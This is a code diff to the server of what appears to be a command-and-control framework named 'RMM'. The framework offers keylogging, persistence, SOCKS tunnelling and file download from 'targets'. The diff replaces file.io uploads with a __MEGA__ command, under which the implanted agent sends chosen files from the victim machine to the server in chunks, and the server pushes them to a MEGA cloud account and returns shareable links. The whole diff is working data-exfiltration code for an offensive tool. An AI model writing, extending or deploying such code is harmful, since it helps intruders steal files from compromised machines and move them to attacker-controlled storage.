@@ -40,6 +40,7 @@ except ImportError:
 
 from rmm_ws import OperatorEventHub, WebSocketConnection
 from rmm_socks import DEFAULT_SOCKS_PORT, DEFAULT_BIND_HOST, SocksManager
+from rmm_mega import load_mega_config, upload_file_to_mega, MegaConfigError
 
 # History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
 HISTORY_FILE = os.path.expanduser("~/.RMM_history")
@@ -79,13 +80,9 @@ def _env_int(name: str, default: int) -> int:
 
 # Per HTTP POST (each download chunk). Override with RMM_MAX_BODY_BYTES.
 MAX_BODY_BYTES = _env_int("RMM_MAX_BODY_BYTES", 32 * 1024 * 1024)
-# Agent file.io uploads: max remote file size (lab default 100 MB).
-FILEIO_MAX_BYTES = _env_int("RMM_FILEIO_MAX_BYTES", 100 * 1024 * 1024)
-FILEIO_DEFAULT_EXPIRES = os.environ.get("RMM_FILEIO_DEFAULT_EXPIRES", "14d").strip().lower() or "14d"
-_FILEIO_EXPIRES_RE = re.compile(
-    r"^(1d|2d|3d|7d|14d|1w|2w|1m|2m|3m|6m|1y|\d+[dwmh])$",
-    re.IGNORECASE,
-)
+# Agent → server → MEGA uploads: max remote file size (lab default 100 MB).
+MEGA_MAX_BYTES = _env_int("RMM_MEGA_MAX_BYTES", 100 * 1024 * 1024)
+MEGA_STAGING_DIR = os.path.join(LOG_DIR, "mega_staging")
 
 
 def secure_compare(provided: str, expected: str) -> bool:
@@ -99,12 +96,22 @@ def secure_compare(provided: str, expected: str) -> bool:
     return secrets.compare_digest(a, b)
 
 
-def normalize_fileio_expires(expires: str | None) -> str:
-    """Validate file.io expiry token; fall back to default."""
-    raw = (expires or FILEIO_DEFAULT_EXPIRES).strip().lower()
-    if _FILEIO_EXPIRES_RE.match(raw):
-        return raw
-    return FILEIO_DEFAULT_EXPIRES if _FILEIO_EXPIRES_RE.match(FILEIO_DEFAULT_EXPIRES) else "14d"
+def mega_public_config() -> dict:
+    """Operator-safe MEGA account status (no password)."""
+    return load_mega_config().public_dict()
+
+
+def require_mega_ready() -> dict:
+    """Return public config or raise ValueError with operator message."""
+    cfg = load_mega_config()
+    if not cfg.configured:
+        raise ValueError(
+            "MEGA not configured — set RMM_MEGA_EMAIL and RMM_MEGA_PASSWORD on the server"
+        )
+    pub = cfg.public_dict()
+    if not pub.get("library_available"):
+        raise ValueError("mega.py-v2 not installed — pip install mega.py-v2 (Python 3.10+)")
+    return pub
 
 
 _BEACON_SESSION_UUID_RE = re.compile(
@@ -262,7 +269,7 @@ class Completer:
         self.commands = [
             'list', 'use', 'info', 'background', 'kill',
             'set_sleep', 'set_jitter', 'show_config',
-            'download', 'upload', 'fileio', 'screenshot', 'socks',
+            'download', 'upload', 'mega', 'screenshot', 'socks',
             'keylog', 'persist', 'stop',
             'install_persist', 'remove_persist',
             'help', 'clear', 'quit', 'exit',
@@ -638,10 +645,10 @@ class RMMServer:
         self.note_download_queued(session, remote_path)
         return cmd
 
-    def queue_agent_fileio(self, session, remote_path: str, expires: str | None = None) -> str:
-        """Queue __FILEIO__ on the agent (upload remote file to file.io)."""
-        exp = normalize_fileio_expires(expires)
-        cmd = f"__FILEIO__ {remote_path} {exp}"
+    def queue_agent_mega(self, session, remote_path: str) -> str:
+        """Queue __MEGA__ on the agent (stage file on server, upload to MEGA account)."""
+        require_mega_ready()
+        cmd = f"__MEGA__ {remote_path}"
         self.set_command(session.id, cmd, "oneshot")
         return cmd
 
@@ -1124,6 +1131,50 @@ class RMMServer:
         os.replace(staging_path, final_path)
         return final_path
 
+    def _save_mega_staging(self, session, data: dict, timestamp: str) -> str | None:
+        """Write agent mega_staging payload. Returns final path when complete, else None (chunk)."""
+        raw_name = data.get("filename", f"unknown_{timestamp}")
+        filename = safe_storage_filename(raw_name, f"unknown_{timestamp}")
+        os.makedirs(MEGA_STAGING_DIR, exist_ok=True)
+        prefix = safe_session_storage_prefix(session.id)
+        final_path = safe_join_under(MEGA_STAGING_DIR, f"{prefix}_{filename}")
+        content = base64.b64decode(data.get("content", "") or "")
+
+        if "offset" not in data:
+            with open(final_path, "wb") as f:
+                f.write(content)
+            return final_path
+
+        upload_id = re.sub(r"[^\w-]", "", str(data.get("upload_id") or "default"))[:64] or "default"
+        staging_path = safe_join_under(MEGA_STAGING_DIR, f"{prefix}_{upload_id}.part")
+        offset = int(data.get("offset", 0))
+        mode = "wb" if offset == 0 else "ab"
+        with open(staging_path, mode) as f:
+            f.write(content)
+        if not data.get("eof"):
+            return None
+        os.replace(staging_path, final_path)
+        return final_path
+
+    def _finish_mega_upload(self, session, filepath: str, remote_path: str) -> dict:
+        """Upload staged file to MEGA and return result payload for events."""
+        dest_name = os.path.basename(filepath)
+        try:
+            outcome = upload_file_to_mega(filepath, dest_filename=dest_name)
+        finally:
+            try:
+                os.remove(filepath)
+            except OSError:
+                pass
+        return {
+            "type": "mega_upload",
+            "remote_path": remote_path,
+            "success": bool(outcome.get("success")),
+            "link": outcome.get("link"),
+            "size": outcome.get("size", 0),
+            "error": outcome.get("error"),
+        }
+
     def handle_result(self, session_id, result, cmd_type="output"):
         session = self.get_session(session_id)
         if not session:
@@ -1191,6 +1242,54 @@ class RMMServer:
         elif cmd_type == "config_ack":
             event_body = result
             tty_lines.append(("log", f"Session {session.id[:8]} acknowledged config update", "SUCCESS"))
+
+        elif cmd_type == "mega_staging":
+            try:
+                data = json.loads(result)
+                filepath = self._save_mega_staging(session, data, timestamp)
+                if not filepath:
+                    return
+                remote_path = (data.get("remote_path") or "").strip()
+                if not remote_path:
+                    remote_path = data.get("filename", "")
+                payload = self._finish_mega_upload(session, filepath, remote_path)
+                echoed_cmd = f"__MEGA__ {remote_path}".strip()
+                if payload.get("success"):
+                    link = (payload.get("link") or "").strip()
+                    event_body = f"{remote_path} → {link}" if link else remote_path
+                    tty_lines.append(("log", f"MEGA upload: {link or remote_path}", "SUCCESS"))
+                else:
+                    err = payload.get("error") or "MEGA upload failed"
+                    event_body = f"{remote_path}: {err}" if remote_path else str(err)
+                    tty_lines.append(("log", f"MEGA upload failed: {err}", "ERROR"))
+                cmd_type = "mega_upload"
+            except MegaConfigError as e:
+                event_body = str(e)
+                echoed_cmd = None
+                cmd_type = "mega_upload"
+                tty_lines.append(("log", f"MEGA config error: {e}", "ERROR"))
+            except Exception as e:
+                event_body = str(e)
+                echoed_cmd = None
+                cmd_type = "mega_upload"
+                tty_lines.append(("log", f"MEGA staging error: {e}", "ERROR"))
+
+        elif cmd_type == "mega_upload":
+            try:
+                data = json.loads(result)
+                remote_path = (data.get("remote_path") or "").strip()
+                echoed_cmd = f"__MEGA__ {remote_path}".strip()
+                if data.get("success"):
+                    link = (data.get("link") or "").strip()
+                    event_body = f"{remote_path} → {link}" if link else remote_path
+                    tty_lines.append(("log", f"MEGA upload: {link or remote_path}", "SUCCESS"))
+                else:
+                    err = data.get("error") or "MEGA upload failed"
+                    event_body = f"{remote_path}: {err}" if remote_path else str(err)
+                    tty_lines.append(("log", f"MEGA upload failed: {err}", "ERROR"))
+            except Exception as e:
+                event_body = str(e)
+                tty_lines.append(("log", f"MEGA result error: {e}", "ERROR"))
 
         elif cmd_type == "fileio_upload":
             try:
@@ -1498,6 +1597,10 @@ class RMMHandler(BaseHTTPRequestHandler):
             return False
         srv = self.server_instance
 
+        if parts == ["mega", "config"]:
+            self._json(200, mega_public_config())
+            return True
+
         if parts == ["health"]:
             self._json(200, {"status": "ok", "sessions": len(srv.sessions)})
             return True
@@ -1651,7 +1754,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._json(200, {"ok": True, "session_id": session.id, "queued": cmd})
             return True
 
-        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "fileio":
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "mega":
             session = srv.resolve_session(parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
@@ -1660,17 +1763,20 @@ class RMMHandler(BaseHTTPRequestHandler):
             if not remote_path:
                 self._json(400, {"error": "missing_remote_path"})
                 return True
-            expires = body.get("expires")
-            cmd = srv.queue_agent_fileio(session, remote_path, expires=expires)
-            srv.record_operator_action(session, cmd, "fileio")
+            try:
+                cmd = srv.queue_agent_mega(session, remote_path)
+            except ValueError as e:
+                self._json(503, {"error": str(e), "mega": mega_public_config()})
+                return True
+            srv.record_operator_action(session, cmd, "mega")
             self._json(
                 200,
                 {
                     "ok": True,
                     "session_id": session.id,
                     "queued": cmd,
-                    "max_bytes": FILEIO_MAX_BYTES,
-                    "expires": normalize_fileio_expires(expires),
+                    "max_bytes": MEGA_MAX_BYTES,
+                    "mega": mega_public_config(),
                 },
             )
             return True
@@ -2064,7 +2170,7 @@ class CommandInterface:
 
 {Colors.CYAN}File Operations:{Colors.END}
   {Colors.GREEN}download <file>{Colors.END}          - Download file from target
-  {Colors.GREEN}fileio <file> [expires]{Colors.END}  - Upload remote file to file.io (ephemeral link)
+  {Colors.GREEN}mega <file>{Colors.END}              - Upload remote file to MEGA (server account)
   {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target
 
 {Colors.CYAN}Tunneling:{Colors.END}
@@ -2266,24 +2372,22 @@ class CommandInterface:
                 else:
                     self.server.tty_print(f"{Colors.RED}Usage: download <file>{Colors.END}")
 
-            elif cmd == "fileio":
+            elif cmd == "mega":
                 if args:
                     session = self.server.get_session(self.server.current_session)
                     if not session:
                         self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                     else:
-                        expires = None
-                        if len(args) >= 2 and _FILEIO_EXPIRES_RE.match(args[-1]):
-                            expires = args[-1]
-                            filepath = " ".join(args[:-1])
-                        else:
-                            filepath = " ".join(args)
-                        self.server.queue_agent_fileio(session, filepath, expires=expires)
-                        self.server.tty_print(
-                            f"{Colors.DIM}file.io upload queued for {filepath}...{Colors.END}"
-                        )
+                        filepath = " ".join(args)
+                        try:
+                            self.server.queue_agent_mega(session, filepath)
+                            self.server.tty_print(
+                                f"{Colors.DIM}MEGA upload queued for {filepath}...{Colors.END}"
+                            )
+                        except ValueError as e:
+                            self.server.tty_print(f"{Colors.RED}{e}{Colors.END}")
                 else:
-                    self.server.tty_print(f"{Colors.RED}Usage: fileio <remote_file> [expires]{Colors.END}")
+                    self.server.tty_print(f"{Colors.RED}Usage: mega <remote_file>{Colors.END}")
 
             elif cmd == "upload":
                 if len(args) >= 2:
